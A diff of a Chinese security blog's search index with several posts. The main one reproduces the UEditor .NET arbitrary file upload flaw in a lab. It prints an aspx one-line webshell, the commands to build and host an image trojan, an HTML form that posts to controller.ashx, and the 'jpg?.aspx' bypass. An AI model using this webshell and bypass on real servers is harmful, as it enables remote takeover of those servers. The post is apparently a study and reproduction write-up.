length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        s = s_box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(data[k]) ^ s))</span><br><span class="line">    result = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4解密后的字符串是:%s&quot;</span> % result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="comment"># main.py</span></span><br><span class="line"><span class="keyword">from</span> rc4 <span class="keyword">import</span> rc4_init_sbox, rc4_encrypt, rc4_decrypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        function = <span class="built_in">input</span>(<span class="string">&quot;E to encrypt or D to decrypt for rc4:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> function.upper() == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            data = <span class="built_in">input</span>(<span class="string">&quot;请输入你要进行RC4加密的数据：&quot;</span>)</span><br><span class="line">            key = <span class="built_in">input</span>(<span class="string">&quot;请输入RC4加密密钥：&quot;</span>)</span><br><span class="line">            s_box = rc4_init_sbox(key)</span><br><span class="line">            rc4_encrypt(s_box, data)</span><br><span class="line">        <span class="keyword">elif</span> function.upper() == <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">            data = <span class="built_in">input</span>(<span class="string">&quot;请输入你要进行RC4解密的数据：&quot;</span>)</span><br><span class="line">            key = <span class="built_in">input</span>(<span class="string">&quot;请输入RC4解密密钥：&quot;</span>)</span><br><span class="line">            s_box = rc4_init_sbox(key)</span><br><span class="line">            rc4_decrypt(s_box, data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入正确的功能&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>参考链接：</p>
+<ul>
+<li><p><a href="https://www.cnblogs.com/gambler/p/9075415.html">https://www.cnblogs.com/gambler/p/9075415.html</a></p>
+</li>
+<li><p><a href="https://www.cnblogs.com/block2016/p/5601925.html">https://www.cnblogs.com/block2016/p/5601925.html</a></p>
+</li>
+<li><p><a href="https://www.jianshu.com/p/d9ad5fc524ec">https://www.jianshu.com/p/d9ad5fc524ec</a></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>密码学</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
       </tags>
   </entry>
   <entry>
@@ -4350,73 +4350,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Ueditor编辑器任意文件上传漏洞</title>
-    <url>/post/bd0a7a34.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>UEditor是一款所见即所得的开源富文本编辑器，具有轻量、可定制、用户体验优秀等特点，被广大WEB应用程序所使用。本次爆出的高危漏洞属于.NET版本，其它的版本暂时不受影响。漏洞成因是在抓取远程数据源的时候未对文件后缀名做验证导致任意文件写入漏洞，黑客利用此漏洞可以在服务器上执行任意指令，综合评级高危。</p>
-<h1 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h1><p>该漏洞影响UEditor的.Net版本，其它语言版本暂时未受影响。</p>
-<h1 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h1><p>漏洞的成因是在获取图片资源时仅检查了Content-Type，导致可以绕过达到任意文件上传。具体的漏洞分析可参考：<a href="https://www.freebuf.com/vuls/181814.html">https://www.freebuf.com/vuls/181814.html</a></p>
-<h1 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h1><h2 id="1、环境部署"><a href="#1、环境部署" class="headerlink" title="1、环境部署"></a>1、环境部署</h2><p>准备一台Windows Server服务器，我用的是Windows 2008 Server。</p>
-<p>没有安装.NET Framework 4.0的要先安装：<a href="http://www.microsoft.com/zh-cn/download/details.aspx?id=17718">http://www.microsoft.com/zh-cn/download/details.aspx?id=17718</a></p>
-<p>安装完 .NET Framework 4.0 后，还需要向 IIS 注册应用程序池，注册的方法是，使用<strong>管理员权限</strong>打开命令提示符（CMD），输入以下命令：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\aspnet_regiis <span class="literal">-i</span></span><br></pre></td></tr></table></figure>
-
-<p>安装完毕后，在 IIS 管理器刷新就能看到 4.0 的应用程序池。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659162290916-6479f4e3-9e62-4f86-b68c-6dd1138b5c2a.png" alt="img"></p>
-<p><a href="https://github.com/fex-team/ueditor/releases/tag/v1.4.3.3%EF%BC%8C%E4%B8%8B%E8%BD%BDutf8%E7%9A%84.net%E7%89%88%E6%9C%AC">https://github.com/fex-team/ueditor/releases/tag/v1.4.3.3，下载utf8的.net版本</a></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659177928306-4d7a6b76-56b7-4ce9-be0a-f36d91887f93.png" alt="img"></p>
-<p>右键 网站–添加网站，选择下载的Ueditor目录， 选择版本为 4.0 的应用程序池；点击连接为，设置特定用户，该特定用户为主机上存在的用户例如administrator</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659173633936-90ae8d26-3b7e-4ae2-818b-823adce804cd.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659176476037-ba138061-20d7-4e50-bcdc-b24a7a8e6f0c.png" alt="img"></p>
-<p>此时访问127.0.0.1:8080已经有Ueditor的界面了</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659167319446-b4438260-37b0-4719-b91d-626a292ca1ad.png" alt="img"></p>
-<p>代码要求以应用程序的形式来运行（可以方便加入库依赖和组织代码）。所以需要把 net 目录转换为应用程序；点击连接为，设置特定用户，该特定用户为主机上存在的用户例如administrator</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659173688195-68663067-848f-454b-a44c-5245feb61ea1.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659176447829-104fb267-7ef4-4799-8adf-8f00a36e1bf7.png" alt="img"></p>
-<p>访问net/controller.ashx 控制器文件，出现以下界面说明编辑器应用程序运行成功，且漏洞存在，到此配置完毕。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659167479945-47a31c7f-57f2-48f2-b8f2-9bb51b3960ab.png" alt="img"></p>
-<p>如果配置过程中访问页面显示权限不够的报错，那么<strong>右键部署项目的文件夹，选择属性，选择安全，增加Everyone用户，将该用户的权限设置为完全控制，点击确定，重新部署即可。</strong></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659167533505-10050ba7-d702-4c38-abde-0c9421502c0f.png" alt="img"></p>
-<h2 id="2、攻击流程"><a href="#2、攻击流程" class="headerlink" title="2、攻击流程"></a>2、攻击流程</h2><p>访问<a href="http://ip:port/net/controller.ashx">http://ip:port/net/controller.ashx</a> 控制器文件。当出现下图的时候表示漏洞存在</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659169448619-8664c47f-4b11-40a6-a53c-c82041bcc708.png" alt="img"></p>
-<p>准确一个aspx一句话木马</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;% @Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;w01ke&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>制作图片马</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> w01ke.jpg /b + shell.aspx /a ueditor.jpg</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659171073192-49c1da52-0cc8-439c-a329-9a5895157209.png" alt="img"></p>
-<p>准确一台服务器存放图片马或者需要上传的文件，将做好的ueditor.jpg图片马上传到我们的服务器，并开启下载服务（HTTP）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659171520246-73c7a63c-53d6-474c-82cb-7cb73f0390cf.png" alt="img"></p>
-<p>制作一个HTML。因为不是上传漏洞所以enctype 不需要指定为multipart/form-data。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://xxxxx/controller.ashx?action=catchimage&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span>&lt;/p &gt;</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>其中<a href="http://xx.com为需要测试的网站地址,action后填写路径为实际中遇到的路径,不要太死板,如果太死板不按网站的实际路径来就会出现路径找不到的错误/">http://xx.com为需要测试的网站地址，action后填写路径为实际中遇到的路径，不要太死板，如果太死板不按网站的实际路径来就会出现路径找不到的错误</a></p>
-<p>打开我们做好的HTML，shell addr 处填写服务器上图片马地址，构造成以下格式，绕过上传使其解析为 aspx</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxxx/ueditor.jpg?.aspx</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659172092537-683d30c8-7faf-4081-9e0a-d2a7c73cd205.png" alt="img"></p>
-<p>点击submit，直接显示无效URL</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659172156714-3008c54c-1148-490c-81d9-63babb1c6e3c.png" alt="img"></p>
-<p>经过排查，发现不能用Python开启web的方式，貌似只能用域名的形式（我不确定），我只好把我的图片马上传至云服务器，然后修改访问域名即可成功，同时回显了木马路径</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659177677192-090b8249-8604-496c-8694-5cecd1e7e307.png" alt="img"></p>
-<p>使用蚁剑连接：</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659177867343-d5e35a4d-dd6f-469f-8927-0e10bf35c693.png" alt="img"></p>
-<h1 id="五、防御措施"><a href="#五、防御措施" class="headerlink" title="五、防御措施"></a>五、防御措施</h1><ol>
-<li>修改CrawlerHandler.cs 增加对文件扩展名的；</li>
-<li>IPS等防御产品可以加入相应的特征</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>Ueditor</tag>
-        <tag>.NET</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Vulhub-DC-1-Drupal</title>
     <url>/post/58fcce74.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶机说明"><a href="#一、靶机说明" class="headerlink" title="一、靶机说明"></a>一、靶机说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;靶场镜像：链接: <a href="https://www.vulnhub.com/entry/dc-1-1,292/">https://www.vulnhub.com/entry/dc-1-1,292/</a></p>
@@ -4582,6 +4515,73 @@
         <tag>CTF</tag>
         <tag>提权</tag>
         <tag>Drupal</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ueditor编辑器任意文件上传漏洞</title>
+    <url>/post/bd0a7a34.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>UEditor是一款所见即所得的开源富文本编辑器，具有轻量、可定制、用户体验优秀等特点，被广大WEB应用程序所使用。本次爆出的高危漏洞属于.NET版本，其它的版本暂时不受影响。漏洞成因是在抓取远程数据源的时候未对文件后缀名做验证导致任意文件写入漏洞，黑客利用此漏洞可以在服务器上执行任意指令，综合评级高危。</p>
+<h1 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h1><p>该漏洞影响UEditor的.Net版本，其它语言版本暂时未受影响。</p>
+<h1 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h1><p>漏洞的成因是在获取图片资源时仅检查了Content-Type，导致可以绕过达到任意文件上传。具体的漏洞分析可参考：<a href="https://www.freebuf.com/vuls/181814.html">https://www.freebuf.com/vuls/181814.html</a></p>
+<h1 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h1><h2 id="1、环境部署"><a href="#1、环境部署" class="headerlink" title="1、环境部署"></a>1、环境部署</h2><p>准备一台Windows Server服务器，我用的是Windows 2008 Server。</p>
+<p>没有安装.NET Framework 4.0的要先安装：<a href="http://www.microsoft.com/zh-cn/download/details.aspx?id=17718">http://www.microsoft.com/zh-cn/download/details.aspx?id=17718</a></p>
+<p>安装完 .NET Framework 4.0 后，还需要向 IIS 注册应用程序池，注册的方法是，使用<strong>管理员权限</strong>打开命令提示符（CMD），输入以下命令：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\aspnet_regiis <span class="literal">-i</span></span><br></pre></td></tr></table></figure>
+
+<p>安装完毕后，在 IIS 管理器刷新就能看到 4.0 的应用程序池。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659162290916-6479f4e3-9e62-4f86-b68c-6dd1138b5c2a.png" alt="img"></p>
+<p><a href="https://github.com/fex-team/ueditor/releases/tag/v1.4.3.3">https://github.com/fex-team/ueditor/releases/tag/v1.4.3.3</a> 下载utf8的.net版本</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659177928306-4d7a6b76-56b7-4ce9-be0a-f36d91887f93.png" alt="img"></p>
+<p>右键 网站–添加网站，选择下载的Ueditor目录， 选择版本为 4.0 的应用程序池；点击连接为，设置特定用户，该特定用户为主机上存在的用户例如administrator</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659173633936-90ae8d26-3b7e-4ae2-818b-823adce804cd.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659176476037-ba138061-20d7-4e50-bcdc-b24a7a8e6f0c.png" alt="img"></p>
+<p>此时访问127.0.0.1:8080已经有Ueditor的界面了</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659167319446-b4438260-37b0-4719-b91d-626a292ca1ad.png" alt="img"></p>
+<p>代码要求以应用程序的形式来运行（可以方便加入库依赖和组织代码）。所以需要把 net 目录转换为应用程序；点击连接为，设置特定用户，该特定用户为主机上存在的用户例如administrator</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659173688195-68663067-848f-454b-a44c-5245feb61ea1.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659176447829-104fb267-7ef4-4799-8adf-8f00a36e1bf7.png" alt="img"></p>
+<p>访问net/controller.ashx 控制器文件，出现以下界面说明编辑器应用程序运行成功，且漏洞存在，到此配置完毕。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659167479945-47a31c7f-57f2-48f2-b8f2-9bb51b3960ab.png" alt="img"></p>
+<p>如果配置过程中访问页面显示权限不够的报错，那么<strong>右键部署项目的文件夹，选择属性，选择安全，增加Everyone用户，将该用户的权限设置为完全控制，点击确定，重新部署即可。</strong></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659167533505-10050ba7-d702-4c38-abde-0c9421502c0f.png" alt="img"></p>
+<h2 id="2、攻击流程"><a href="#2、攻击流程" class="headerlink" title="2、攻击流程"></a>2、攻击流程</h2><p>访问<a href="http://ip:port/net/controller.ashx">http://ip:port/net/controller.ashx</a> 控制器文件。当出现下图的时候表示漏洞存在</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659169448619-8664c47f-4b11-40a6-a53c-c82041bcc708.png" alt="img"></p>
+<p>准确一个aspx一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;% @Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;w01ke&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>制作图片马</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> w01ke.jpg /b + shell.aspx /a ueditor.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659171073192-49c1da52-0cc8-439c-a329-9a5895157209.png" alt="img"></p>
+<p>准确一台服务器存放图片马或者需要上传的文件，将做好的ueditor.jpg图片马上传到我们的服务器，并开启下载服务（HTTP）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659171520246-73c7a63c-53d6-474c-82cb-7cb73f0390cf.png" alt="img"></p>
+<p>制作一个HTML。因为不是上传漏洞所以enctype 不需要指定为multipart/form-data。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://xxxxx/controller.ashx?action=catchimage&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span>&lt;/p &gt;</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中<a href="http://xx.com/">http://xx.com</a> 为需要测试的网站地址，action后填写路径为实际中遇到的路径，不要太死板，如果太死板不按网站的实际路径来就会出现路径找不到的错误</p>
+<p>打开我们做好的HTML，shell addr 处填写服务器上图片马地址，构造成以下格式，绕过上传使其解析为 aspx</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxxx/ueditor.jpg?.aspx</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659172092537-683d30c8-7faf-4081-9e0a-d2a7c73cd205.png" alt="img"></p>
+<p>点击submit，直接显示无效URL</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659172156714-3008c54c-1148-490c-81d9-63babb1c6e3c.png" alt="img"></p>
+<p>经过排查，发现不能用Python开启web的方式，貌似只能用域名的形式（我不确定），我只好把我的图片马上传至云服务器，然后修改访问域名即可成功，同时回显了木马路径</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659177677192-090b8249-8604-496c-8694-5cecd1e7e307.png" alt="img"></p>
+<p>使用蚁剑连接：</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659177867343-d5e35a4d-dd6f-469f-8927-0e10bf35c693.png" alt="img"></p>
+<h1 id="五、防御措施"><a href="#五、防御措施" class="headerlink" title="五、防御措施"></a>五、防御措施</h1><ol>
+<li>修改CrawlerHandler.cs 增加对文件扩展名的；</li>
+<li>IPS等防御产品可以加入相应的特征</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Ueditor</tag>
+        <tag>.NET</tag>
       </tags>
   </entry>
   <entry>
@@ -5136,119 +5136,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Web源码拓展</title>
-    <url>/post/de8a59bf.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&emsp;&emsp;WEB 源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中 WEB 源码有很多技术需要简明分析。 比如：获取某 ASP 源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009190194-959ddb49-0e3e-4e9c-824e-8356fe945d9c.png" alt="img"></p>
-<h1 id="二、关于Web源码目录结构"><a href="#二、关于Web源码目录结构" class="headerlink" title="二、关于Web源码目录结构"></a>二、关于Web源码目录结构</h1><p>&emsp;&emsp;数据库配置文件，后台目录，模板目录，数据库目录等</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">index.php 根据文件后缀判定</span><br><span class="line">admin 网站后台路径</span><br><span class="line">data 数据相关目录</span><br><span class="line">install 安装目录</span><br><span class="line">member 会员目录</span><br><span class="line">template 模板目录(和网站相关的整体架构)</span><br><span class="line">data =&gt; confing.php 数据库配置文件，网站和数据库的通讯信息，连接账号密码，可以去连接对方数据库，从数据库去得到这个网站的源码里面涉及到的管理员的账号密码。</span><br></pre></td></tr></table></figure>
-
-<h1 id="三、关于Web源码脚本类型"><a href="#三、关于Web源码脚本类型" class="headerlink" title="三、关于Web源码脚本类型"></a>三、关于Web源码脚本类型</h1><p>&emsp;&emsp;ASP，PHP，ASPX，JSP，JAVAWEB等脚本类型源码安全问题</p>
-<h1 id="四、关于Web源码应用分类"><a href="#四、关于Web源码应用分类" class="headerlink" title="四、关于Web源码应用分类"></a>四、关于Web源码应用分类</h1><p>&emsp;&emsp;社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p>
-<p>&emsp;&emsp;开源，未开源问题， 框架非框架问题，关于CMS识别问题及后续等</p>
-<p>&emsp;&emsp;拿到对方的源码或者判断这个网站的应用类型之后应该侧重在哪些漏洞上做文章</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">门户网站------------------------综合类漏洞</span><br><span class="line">电商------------------------------业务逻辑漏洞</span><br><span class="line">论坛------------------------------XSS漏洞</span><br><span class="line">博客------------------------------漏洞较少</span><br><span class="line">第三方---------------------------根据功能决定</span><br></pre></td></tr></table></figure>
-
-<h1 id="五、关于Web源码其他说明"><a href="#五、关于Web源码其他说明" class="headerlink" title="五、关于Web源码其他说明"></a>五、关于Web源码其他说明</h1><h2 id="1、框架与非框架"><a href="#1、框架与非框架" class="headerlink" title="1、框架与非框架"></a>1、框架与非框架</h2><p>&emsp;&emsp;如果对方网站采用的是框架开发的话那么你面对的就是寻找框架的漏洞，如果是非框架的话寻找的漏洞针对的是代码写出来的漏洞（代码审计）</p>
-<p>&emsp;&emsp;比如：thinkPHP漏洞</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631293351122-9dbf0276-75c9-45eb-a615-80b48801c33c.png" alt="img"></p>
-<h2 id="2、CMS识别"><a href="#2、CMS识别" class="headerlink" title="2、CMS识别"></a>2、CMS识别</h2><h3 id="（1）CMS的概念"><a href="#（1）CMS的概念" class="headerlink" title="（1）CMS的概念"></a>（1）CMS的概念</h3><p>&emsp;&emsp;CMS是Content Management System的缩写，意为”内容管理系统”。 内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场。 内容管理系统组成要素</p>
-<ul>
-<li><p>文档模板</p>
-</li>
-<li><p>脚本语言或标记语言</p>
-</li>
-<li><p>与数据库集成</p>
-</li>
-</ul>
-<h3 id="（2）CMS识别方法"><a href="#（2）CMS识别方法" class="headerlink" title="（2）CMS识别方法"></a>（2）CMS识别方法</h3><h4 id="①-人工识别"><a href="#①-人工识别" class="headerlink" title="① 人工识别"></a>① 人工识别</h4><p>&emsp;&emsp;直接看出来</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631293980513-4a2c0f3b-aae7-4b9f-bdde-fc37fa630102.png" alt="img"></p>
-<h4 id="②-CMS识别在线工具"><a href="#②-CMS识别在线工具" class="headerlink" title="② CMS识别在线工具"></a>② CMS识别在线工具</h4><p>&emsp;&emsp;在线cms指纹识别：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631293657770-654bae62-7305-4d56-9102-c9dab166728c.png" alt="img"></p>
-<p>&emsp;&emsp;云悉：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631293692731-0fe7d591-52b7-4566-a8aa-a1d96fb61214.png" alt="img"></p>
-<h4 id="③-工具"><a href="#③-工具" class="headerlink" title="③ 工具"></a>③ 工具</h4><p><strong>使用字典</strong></p>
-<p>&emsp;&emsp;因为每个文件都有个特定的md5值，我们可以通过访问一个网站的文件，保存到本地后，查看该文件的md5值，和字典中的md5值进行比较，如果相同，说明该网站的cms对应字典上该条记录的cms</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631322562277-e6883691-ab81-4f74-a27e-6b6a7bedb2a9.png" alt="img"></p>
-<p>&emsp;&emsp;查看文件MD5等值的命令</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">certutil <span class="literal">-hashfile</span> D:\file.txt MD5</span><br><span class="line"></span><br><span class="line">certutil <span class="literal">-hashfile</span> D:\file.txt SHA1</span><br><span class="line"></span><br><span class="line">certutil <span class="literal">-hashfile</span> D:\file.txt SHA256</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;假设访问这个网站：<a href="http://192.168.1.105:8032/%EF%BC%8C%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AEhttp://192.168.1.105:8032/favicon.ico">http://192.168.1.105:8032/，尝试访问http://192.168.1.105:8032/favicon.ico</a> ，的确存在该图标，将该图标文件保存到本地</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631323530035-7fff5410-b4cd-47fa-80de-c5c505c3d6d3.png" alt="img"></p>
-<p>&emsp;&emsp;生成该文件的md5值：<code>certutil -hashfile favico.ico md5</code></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631323446326-e24e27f0-280f-4a59-934e-554ef9db4815.png" alt="img"></p>
-<p>&emsp;&emsp;在字典中查询md5值，发现有记录，该CMS对应的是metinfo，正确</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631323410923-9af97530-9da8-47b4-b11b-101660153a48.png" alt="img"></p>
-<p>&emsp;&emsp;字典链接：<a href="https://github.com/Lucifer1993/cmsprint">https://github.com/Lucifer1993/cmsprint</a></p>
-<h1 id="六、开源或内部"><a href="#六、开源或内部" class="headerlink" title="六、开源或内部"></a>六、开源或内部</h1><p>&emsp;&emsp;开源：去网上找寻漏洞文章。直接找漏洞或审计（可以通过CMS识别出来的）</p>
-<p>&emsp;&emsp;内部：常规的渗透测试，用扫描工具去判断。（找不到源码或者不知道对方的CMS名称）</p>
-<h1 id="七、源码获取"><a href="#七、源码获取" class="headerlink" title="七、源码获取"></a>七、源码获取</h1><ul>
-<li><p>扫描工具探测备份文件</p>
-</li>
